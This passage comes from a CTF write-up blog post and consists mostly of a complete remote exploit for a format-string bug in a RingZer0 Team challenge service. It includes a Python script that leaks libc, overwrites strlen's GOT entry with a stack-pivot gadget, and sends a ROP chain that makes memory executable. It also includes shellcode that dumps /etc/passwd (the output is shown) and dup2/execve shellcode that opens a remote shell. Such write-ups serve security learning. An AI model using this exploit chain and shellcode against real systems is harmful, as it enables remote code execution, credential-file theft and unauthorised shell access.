</span><span class='line'><span class="k">def</span> <span class="nf">read_from_address</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">addr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>       <span class="c"># change address</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>     <span class="c"># write byte</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dump1</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">dump1</span>
</span><span class='line'>
</span><span class='line'><span class="c"># write a value to a string format parameter</span>
</span><span class='line'><span class="k">def</span> <span class="nf">write_on_stack</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># write out all the bytes of what</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">what</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] wrote {} to {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)),</span> <span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># grab strlen from the GOT entry</span>
</span><span class='line'><span class="n">strlen_addr</span> <span class="o">=</span> <span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x601b00</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] strlen is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">strlen_addr</span><span class="p">))</span>
</span><span class='line'><span class="n">libc_base</span> <span class="o">=</span> <span class="n">strlen_addr</span> <span class="o">-</span> <span class="mh">0x80c40</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] libc_base is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">STACK_PIVOT</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x082cfe</span>        <span class="c"># add rsp, 0x100; ret</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] stack pivot gadget is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">STACK_PIVOT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to have three addresses on the stack which we can directly address</span>
</span><span class='line'><span class="c"># to use them in the format string vuln </span>
</span><span class='line'><span class="c"># strlen</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601b00</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601b01</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601b02</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># need to write out the last three bytes of the STACK_PIVOT gadget over strlen&#39;s bytes</span>
</span><span class='line'><span class="n">writebytes</span> <span class="o">=</span> <span class="n">STACK_PIVOT</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span>   
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">lastbyte</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="c"># build format string to set three bytes at once</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">lastbyte</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">):</span>
</span><span class='line'>      <span class="n">byte_to_write</span> <span class="o">=</span> <span class="p">(</span><span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="n">lastbyte</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span> 
</span><span class='line'>      <span class="n">byte_to_write</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">+</span> <span class="p">(</span><span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="n">lastbyte</span>
</span><span class='line'>      
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;%{}c&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">byte_to_write</span><span class="p">)</span>
</span><span class='line'>  <span class="n">lastbyte</span> <span class="o">=</span> <span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">writebytes</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;%{}$hhn&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">format_offset</span><span class="o">+</span><span class="mi">636</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] writing {} to strlen&#39;s GOT entry&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">STACK_PIVOT</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] format string payload: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect and send the format string</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c"># now, strlen&#39;s GOT entry will point to the stack lifting gadget</span>
</span><span class='line'>
</span><span class='line'><span class="c"># let&#39;s prepare the ROP chain</span>
</span><span class='line'><span class="c"># here are the gadgets</span>
</span><span class='line'><span class="n">SYSCALL</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0ad215</span>
</span><span class='line'><span class="n">POP_RAX</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x041dc8</span>
</span><span class='line'><span class="n">POP_RSI</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x021535</span>
</span><span class='line'><span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x02028b</span>
</span><span class='line'><span class="n">POP_RDX</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0a834b</span>
</span><span class='line'>
</span><span class='line'><span class="n">ropchain</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="c"># mprotect 0x400000 to rwx, so we can write AND execute from it</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RAX</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>     <span class="c"># points to ret; effectively, a NOP!</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>                  <span class="c"># syscall mprotect</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>            <span class="c"># start of buffer to mprotect</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>              <span class="c"># length of buffer</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>                   <span class="c"># flags; rwx</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>             <span class="c"># after executing this syscall, 0x400000 should be rwx</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to fetch the socket from memory</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2028a</span><span class="p">)</span> <span class="c"># pop r15; ret</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mh">0x48</span><span class="p">)</span>               <span class="c">#</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x6933f</span><span class="p">)</span> <span class="c"># lea rax, [rbp + r15]; set rax to address that contains socket descriptor</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">31337</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span>             <span class="c"># junk for all the pop r64&#39;s</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xeb938</span><span class="p">)</span> <span class="c"># mov rax, [rax]; grabs value of socket descriptor</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2c10e</span><span class="p">)</span> <span class="c"># xchg eax, edi; edi now contains the socket descriptor</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read in the shellcode from the socket (sockfd in rdi already)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="c"># syscall read</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>            <span class="c"># start of buffer</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>              <span class="c"># size of buffer</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>             <span class="c"># after this syscall, the shellcode should be at 0x400000</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>            <span class="c"># so return to it!</span>
</span><span class='line'>
</span><span class='line'><span class="c"># rdi still contains socket fd!</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'><span class="c"># send our ropchain</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">ropchain</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'><span class="c"># modified read /etc/passwd, original by Mr.Un1k0d3r</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x49\x87\xff\xeb\x3e\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x90\x90\x90\x49\x87\xff\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># handle the incoming connection; in this case, grab the contents of /etc/passwd</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>parameter <span class="m">5</span> points to:  0x7fffb6657fc8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fffb6658f51
</span><span class='line'>scratch contains:  0x72632f656d6f682f
</span><span class='line'>scratch is parameter 1123
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> strlen is at 0x7f7af6e72c40.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc_base is at 0x7f7af6df2000.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> stack pivot gadget is at 0x7f7af6e74cfe.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601b00 to 1123
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601b01 to 1124
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601b02 to 1125
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> writing 0xe74cfe to strlen<span class="err">&#39;</span>s GOT entry
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> format string payload: %254c%1123<span class="nv">$hhn</span>%78c%1124<span class="nv">$hhn</span>%155c%1125<span class="nv">$hhn</span>
</span><span class='line'>
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>Debian-exim:x:101:103::/var/spool/exim4:/bin/false
</span><span class='line'>statd:x:102:65534::/var/lib/nfs:/bin/false
</span><span class='line'>sshuser:x:1000:1000:sshuser,,,:/home/sshuser:/bin/bash
</span><span class='line'>mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>crackme:x:1001:1001::/home/crackme:/bin/sh
</span><span class='line'>*** Connection closed by remote host ***
</span></code></pre></td></tr></table></div></figure>


<p>Cool, we have arbitrary code execution on the remote box! But remember, the goal was to get a shell&hellip;</p>

<h2>Shell&rsquo;s up</h2>

<p>The actual shellcode that landed me a shell uses <code>dup2</code> to duplicate stdin from the socket. This will allow us to communicate with the spawned shell. The assembly is quite straightforward. Not optimized, not pretty:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>push rdi
</span><span class='line'>push rdi
</span><span class='line'>push <span class="m">33</span>         <span class="p">;</span> dup2
</span><span class='line'>pop rax         <span class="p">;</span> <span class="nb">set </span>rax to dup2
</span><span class='line'>                <span class="p">;</span> rdi still contains the socket fd
</span><span class='line'>xor esi, esi    <span class="p">;</span> stdin
</span><span class='line'>syscall
</span><span class='line'>pop rdi
</span><span class='line'>inc rsi         <span class="p">;</span> stdout
</span><span class='line'>syscall
</span><span class='line'>pop rdi
</span><span class='line'>inc rsi         <span class="p">;</span> stderr
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>jmp _there
</span><span class='line'>_here:
</span><span class='line'>pop rdi         <span class="p">;</span> points to /bin/sh
</span><span class='line'>xor esi, esi    <span class="p">;</span> <span class="nv">argv</span> <span class="o">=</span> NULL
</span><span class='line'>xor edx, edx    <span class="p">;</span> <span class="nv">argp</span> <span class="o">=</span> NULL
</span><span class='line'>push <span class="m">59</span>         <span class="p">;</span> execve
</span><span class='line'>pop rax
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>push <span class="m">60</span>         <span class="p">;</span> <span class="nb">exit</span>
</span><span class='line'>pop rax
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>_there:
</span><span class='line'>call _here
</span><span class='line'>db <span class="s2">&quot;/bin/sh&quot;</span>, 0
</span></code></pre></td></tr></table></div></figure>


<p>After sticking that shellcode in the exploit, I got a shell!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x57\x57\x6a\x21\x58\x31\xf6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\xeb\x0f\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00</span><span class="s">&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="/assets/maximum-overkill-two/01-interactive-shell-on-remote-box.png" alt="" /></p>

<p>You can see that the <code>dup2</code> shellcode is not completely effective; I needed to redirect stdout to stdin to get command output so somehow <code>dup2</code> does not duplicate stdout correctly. But hey, the objective is met! An interactive shell on an otherwise inaccessible server!</p>

<h2>Wrapping up</h2>

<p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>

<p>Until the next #maximumoverkill :]</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>

      




<time class='entry-date' datetime='2015-02-22T13:01:22+01:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>1:01 pm</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/aslr/'>aslr</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/exploit/'>exploit</a>, <a class='category' href='/blog/categories/format-string/'>format_string</a>, <a class='category' href='/blog/categories/pwnable/'>pwnable</a>, <a class='category' href='/blog/categories/ringzer0team/'>ringzer0team</a>, <a class='category' href='/blog/categories/rop/'>rop</a>
  
</span>


    </p>
    
      <div class="sharing">
  
